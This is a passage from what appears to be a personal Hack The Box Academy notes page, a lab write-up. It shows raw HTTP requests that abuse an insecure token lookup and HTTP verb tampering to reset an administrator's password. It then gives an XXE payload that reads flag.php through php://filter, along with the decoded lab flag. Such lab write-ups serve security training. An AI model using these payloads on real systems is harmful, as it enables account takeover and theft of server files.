<div class="language-html highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-443-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-443-1"><a id="__codelineno-443-1" name="__codelineno-443-1"></a>GET /api.php/token/52
</span></code></pre></div></td></tr></table></div>
<p>And for updating the password, the original request is:</p>
<div class="language-html highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-444-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-444-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-444-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-444-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-444-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-444-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-444-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-444-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-444-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-444-10">10</a></span>
<span class="normal"><a href="#__codelineno-444-11">11</a></span>
<span class="normal"><a href="#__codelineno-444-12">12</a></span>
<span class="normal"><a href="#__codelineno-444-13">13</a></span>
<span class="normal"><a href="#__codelineno-444-14">14</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-444-1"><a id="__codelineno-444-1" name="__codelineno-444-1"></a>POST /reset.php HTTP/1.1
</span><span id="__span-444-2"><a id="__codelineno-444-2" name="__codelineno-444-2"></a>Host: 94.237.62.184:54493
</span><span id="__span-444-3"><a id="__codelineno-444-3" name="__codelineno-444-3"></a>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
</span><span id="__span-444-4"><a id="__codelineno-444-4" name="__codelineno-444-4"></a>Accept: */*
</span><span id="__span-444-5"><a id="__codelineno-444-5" name="__codelineno-444-5"></a>Accept-Language: en-US,en;q=0.5
</span><span id="__span-444-6"><a id="__codelineno-444-6" name="__codelineno-444-6"></a>Accept-Encoding: gzip, deflate, br
</span><span id="__span-444-7"><a id="__codelineno-444-7" name="__codelineno-444-7"></a>Referer: http://94.237.62.184:54493/settings.php
</span><span id="__span-444-8"><a id="__codelineno-444-8" name="__codelineno-444-8"></a>Content-Type: application/x-www-form-urlencoded
</span><span id="__span-444-9"><a id="__codelineno-444-9" name="__codelineno-444-9"></a>Content-Length: 65
</span><span id="__span-444-10"><a id="__codelineno-444-10" name="__codelineno-444-10"></a>Origin: http://94.237.62.184:54493
</span><span id="__span-444-11"><a id="__codelineno-444-11" name="__codelineno-444-11"></a>Connection: keep-alive
</span><span id="__span-444-12"><a id="__codelineno-444-12" name="__codelineno-444-12"></a>Cookie: PHPSESSID=7gjv9r7sbl1nvlrrlv2sbgjsfl; uid=74
</span><span id="__span-444-13"><a id="__codelineno-444-13" name="__codelineno-444-13"></a>
</span><span id="__span-444-14"><a id="__codelineno-444-14" name="__codelineno-444-14"></a>uid=74<span class="err">&amp;</span>token=e51a8a14-17ac-11ec-8e67-a3c050fe0c26<span class="err">&amp;</span>password=lalala
</span></code></pre></div></td></tr></table></div>
<p>If we perform an HTTP verb tampering attack we can bypass the authorization restriction:</p>
<div class="language-html highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-445-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-445-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-445-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-445-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-445-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-445-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-445-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-445-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-445-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-445-10">10</a></span>
<span class="normal"><a href="#__codelineno-445-11">11</a></span>
<span class="normal"><a href="#__codelineno-445-12">12</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-445-1"><a id="__codelineno-445-1" name="__codelineno-445-1"></a>GET /reset.php?uid=52<span class="err">&amp;</span>token=e51a85fa-17ac-11ec-8e51-e78234eb7b0c<span class="err">&amp;</span>password=lalala HTTP/1.1
</span><span id="__span-445-2"><a id="__codelineno-445-2" name="__codelineno-445-2"></a>Host: 94.237.62.184:54493
</span><span id="__span-445-3"><a id="__codelineno-445-3" name="__codelineno-445-3"></a>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
</span><span id="__span-445-4"><a id="__codelineno-445-4" name="__codelineno-445-4"></a>Accept: */*
</span><span id="__span-445-5"><a id="__codelineno-445-5" name="__codelineno-445-5"></a>Accept-Language: en-US,en;q=0.5
</span><span id="__span-445-6"><a id="__codelineno-445-6" name="__codelineno-445-6"></a>Accept-Encoding: gzip, deflate, br
</span><span id="__span-445-7"><a id="__codelineno-445-7" name="__codelineno-445-7"></a>Referer: http://94.237.62.184:54493/settings.php
</span><span id="__span-445-8"><a id="__codelineno-445-8" name="__codelineno-445-8"></a>Content-Type: application/x-www-form-urlencoded
</span><span id="__span-445-9"><a id="__codelineno-445-9" name="__codelineno-445-9"></a>Content-Length: 0
</span><span id="__span-445-10"><a id="__codelineno-445-10" name="__codelineno-445-10"></a>Origin: http://94.237.62.184:54493
</span><span id="__span-445-11"><a id="__codelineno-445-11" name="__codelineno-445-11"></a>Connection: keep-alive
</span><span id="__span-445-12"><a id="__codelineno-445-12" name="__codelineno-445-12"></a>Cookie: PHPSESSID=7gjv9r7sbl1nvlrrlv2sbgjsfl; uid=74
</span></code></pre></div></td></tr></table></div>
<p>We have updated the Administrator's password. Now we access to that account. We can see there is a new feature for creating an event. This is the original request that we send:</p>
<div class="language-html highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-446-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-446-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-446-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-446-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-446-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-446-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-446-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-446-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-446-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-446-10">10</a></span>
<span class="normal"><a href="#__codelineno-446-11">11</a></span>
<span class="normal"><a href="#__codelineno-446-12">12</a></span>
<span class="normal"><a href="#__codelineno-446-13">13</a></span>
<span class="normal"><a href="#__codelineno-446-14">14</a></span>
<span class="normal"><a href="#__codelineno-446-15">15</a></span>
<span class="normal"><a href="#__codelineno-446-16">16</a></span>
<span class="normal"><a href="#__codelineno-446-17">17</a></span>
<span class="normal"><a href="#__codelineno-446-18">18</a></span>
<span class="normal"><a href="#__codelineno-446-19">19</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-446-1"><a id="__codelineno-446-1" name="__codelineno-446-1"></a>POST /addEvent.php HTTP/1.1
</span><span id="__span-446-2"><a id="__codelineno-446-2" name="__codelineno-446-2"></a>Host: 94.237.62.184:54493
</span><span id="__span-446-3"><a id="__codelineno-446-3" name="__codelineno-446-3"></a>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
</span><span id="__span-446-4"><a id="__codelineno-446-4" name="__codelineno-446-4"></a>Accept: */*
</span><span id="__span-446-5"><a id="__codelineno-446-5" name="__codelineno-446-5"></a>Accept-Language: en-US,en;q=0.5
</span><span id="__span-446-6"><a id="__codelineno-446-6" name="__codelineno-446-6"></a>Accept-Encoding: gzip, deflate, br
</span><span id="__span-446-7"><a id="__codelineno-446-7" name="__codelineno-446-7"></a>Referer: http://94.237.62.184:54493/event.php
</span><span id="__span-446-8"><a id="__codelineno-446-8" name="__codelineno-446-8"></a>Content-Type: text/plain;charset=UTF-8
</span><span id="__span-446-9"><a id="__codelineno-446-9" name="__codelineno-446-9"></a>Content-Length: 163
</span><span id="__span-446-10"><a id="__codelineno-446-10" name="__codelineno-446-10"></a>Origin: http://94.237.62.184:54493
</span><span id="__span-446-11"><a id="__codelineno-446-11" name="__codelineno-446-11"></a>Connection: keep-alive
</span><span id="__span-446-12"><a id="__codelineno-446-12" name="__codelineno-446-12"></a>Cookie: PHPSESSID=7gjv9r7sbl1nvlrrlv2sbgjsfl; uid=52
</span><span id="__span-446-13"><a id="__codelineno-446-13" name="__codelineno-446-13"></a>
</span><span id="__span-446-14"><a id="__codelineno-446-14" name="__codelineno-446-14"></a>
</span><span id="__span-446-15"><a id="__codelineno-446-15" name="__codelineno-446-15"></a>            <span class="p">&lt;</span><span class="nt">root</span><span class="p">&gt;</span>
</span><span id="__span-446-16"><a id="__codelineno-446-16" name="__codelineno-446-16"></a>            <span class="p">&lt;</span><span class="nt">name</span><span class="p">&gt;</span>Name of event<span class="p">&lt;/</span><span class="nt">name</span><span class="p">&gt;</span>
</span><span id="__span-446-17"><a id="__codelineno-446-17" name="__codelineno-446-17"></a>            <span class="p">&lt;</span><span class="nt">details</span><span class="p">&gt;</span>lele<span class="p">&lt;/</span><span class="nt">details</span><span class="p">&gt;</span>
</span><span id="__span-446-18"><a id="__codelineno-446-18" name="__codelineno-446-18"></a>            <span class="p">&lt;</span><span class="nt">date</span><span class="p">&gt;</span>2025-01-13<span class="p">&lt;/</span><span class="nt">date</span><span class="p">&gt;</span>
</span><span id="__span-446-19"><a id="__codelineno-446-19" name="__codelineno-446-19"></a>            <span class="p">&lt;/</span><span class="nt">root</span><span class="p">&gt;</span>
</span></code></pre></div></td></tr></table></div>
<p>Our payload:</p>
<div class="language-html highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-447-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-447-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-447-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-447-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-447-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-447-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-447-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-447-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-447-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-447-10">10</a></span>
<span class="normal"><a href="#__codelineno-447-11">11</a></span>
<span class="normal"><a href="#__codelineno-447-12">12</a></span>
<span class="normal"><a href="#__codelineno-447-13">13</a></span>
<span class="normal"><a href="#__codelineno-447-14">14</a></span>
<span class="normal"><a href="#__codelineno-447-15">15</a></span>
<span class="normal"><a href="#__codelineno-447-16">16</a></span>
<span class="normal"><a href="#__codelineno-447-17">17</a></span>
<span class="normal"><a href="#__codelineno-447-18">18</a></span>
<span class="normal"><a href="#__codelineno-447-19">19</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-447-1"><a id="__codelineno-447-1" name="__codelineno-447-1"></a>POST /addEvent.php HTTP/1.1
</span><span id="__span-447-2"><a id="__codelineno-447-2" name="__codelineno-447-2"></a>Host: 94.237.62.184:54493
</span><span id="__span-447-3"><a id="__codelineno-447-3" name="__codelineno-447-3"></a>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
</span><span id="__span-447-4"><a id="__codelineno-447-4" name="__codelineno-447-4"></a>Accept: */*
</span><span id="__span-447-5"><a id="__codelineno-447-5" name="__codelineno-447-5"></a>Accept-Language: en-US,en;q=0.5
</span><span id="__span-447-6"><a id="__codelineno-447-6" name="__codelineno-447-6"></a>Accept-Encoding: gzip, deflate, br
</span><span id="__span-447-7"><a id="__codelineno-447-7" name="__codelineno-447-7"></a>Referer: http://94.237.62.184:54493/event.php
</span><span id="__span-447-8"><a id="__codelineno-447-8" name="__codelineno-447-8"></a>Content-Type: text/plain;charset=UTF-8
</span><span id="__span-447-9"><a id="__codelineno-447-9" name="__codelineno-447-9"></a>Content-Length: 289
</span><span id="__span-447-10"><a id="__codelineno-447-10" name="__codelineno-447-10"></a>Origin: http://94.237.62.184:54493
</span><span id="__span-447-11"><a id="__codelineno-447-11" name="__codelineno-447-11"></a>Connection: keep-alive
</span><span id="__span-447-12"><a id="__codelineno-447-12" name="__codelineno-447-12"></a>Cookie: PHPSESSID=7gjv9r7sbl1nvlrrlv2sbgjsfl; uid=52
</span><span id="__span-447-13"><a id="__codelineno-447-13" name="__codelineno-447-13"></a>
</span><span id="__span-447-14"><a id="__codelineno-447-14" name="__codelineno-447-14"></a><span class="cp">&lt;?xml version = &quot;1.0&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ENTITY example1 SYSTEM &quot;php://filter/convert.base64-encode/resource=file:///flag.php&quot;&gt;</span> ]&gt;
</span><span id="__span-447-15"><a id="__codelineno-447-15" name="__codelineno-447-15"></a>            <span class="p">&lt;</span><span class="nt">root</span><span class="p">&gt;</span>
</span><span id="__span-447-16"><a id="__codelineno-447-16" name="__codelineno-447-16"></a>            <span class="p">&lt;</span><span class="nt">name</span><span class="p">&gt;</span><span class="ni">&amp;example1;</span><span class="p">&lt;/</span><span class="nt">name</span><span class="p">&gt;</span>
</span><span id="__span-447-17"><a id="__codelineno-447-17" name="__codelineno-447-17"></a>            <span class="p">&lt;</span><span class="nt">details</span><span class="p">&gt;</span>lele<span class="p">&lt;/</span><span class="nt">details</span><span class="p">&gt;</span>
</span><span id="__span-447-18"><a id="__codelineno-447-18" name="__codelineno-447-18"></a>            <span class="p">&lt;</span><span class="nt">date</span><span class="p">&gt;</span>2025-01-13<span class="p">&lt;/</span><span class="nt">date</span><span class="p">&gt;</span>
</span><span id="__span-447-19"><a id="__codelineno-447-19" name="__codelineno-447-19"></a>            <span class="p">&lt;/</span><span class="nt">root</span><span class="p">&gt;</span>
</span></code></pre></div></td></tr></table></div>
<p><img alt="" src="../img/xxe_28.png" /></p>
<p>After decoding the response <code>PD9waHAgJGZsYWcgPSAiSFRCe200NTczcl93M2JfNDc3NGNrM3J9IjsgPz4K</code>
we obtain: <code>&lt;?php $flag = "HTB{m4573r_w3b_4774ck3r}"; ?&gt;</code></p>
<p>Results: HTB{m4573r_w3b_4774ck3r}</p>
<h2 id="attacking-common-applications"><a href="https://academy.hackthebox.com/module/details/113">Attacking Common Applications</a></h2>
<h2 id="linux-privilege-escalation"><a href="https://academy.hackthebox.com/module/details/51">Linux Privilege Escalation</a></h2>
<h2 id="windows-privilege-escalation"><a href="https://academy.hackthebox.com/module/details/67">Windows Privilege Escalation</a></h2>
<h2 id="documentation-reporting"><a href="https://academy.hackthebox.com/module/details/162">Documentation &amp; Reporting</a></h2>
<h2 id="attacking-enterprise-networks"><a href="https://academy.hackthebox.com/module/details/163">Attacking Enterprise Networks</a></h2>
<p>Question</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-448-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-448-1"><a id="__codelineno-448-1" name="__codelineno-448-1"></a>
</span></code></pre></div></td></tr></table></div>
<p>Results: </p>

<!-- This section adds support for localized revision dates -->

    <small>Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago"><span class="timeago" datetime="2025-01-26T11:43:01+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date">2025-01-26</span></small></br>


    <small>Created: May 31, 2024 18:03:27</small>


                
              </article>
            </div>
          
          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
  Back to top
</button>
        
      </main>
      
        <footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
        <div class="md-social">
  
    
    
    
    
      
      
    
    <a href="https://www.linkedin.com/in/amandaguglieri" target="_blank" rel="noopener" title="www.linkedin.com" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3M135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5m282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9z"/></svg>
    </a>
  
    
    
    
    
      
      
    
    <a href="https://github.com/amandaguglieri" target="_blank" rel="noopener" title="github.com" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8M97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    <script id="__config" type="application/json">{"base": "..", "features": ["navigation.instant", "navigation.top", "navigation.indexes", "navigation.path", "navigation.tab", "content.code.annotate", "content.code.copy", "content.code.select", "search.suggest", "search.highlight", "codehilite", "code-blocks"], "search": "../assets/javascripts/workers/search.f8cc74c7.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
    
    
      <script src="../assets/javascripts/bundle.60a45f97.min.js"></script>
      
        <script src="../js/timeago.min.js"></script>
      
        <script src="../js/timeago_mkdocs_material.js"></script>
      
        <script src="https://unpkg.com/tablesort@5.3.0/dist/tablesort.min.js"></script>
      
        <script src="../js/tablesort.js"></script>
      
    
  </body>
</html>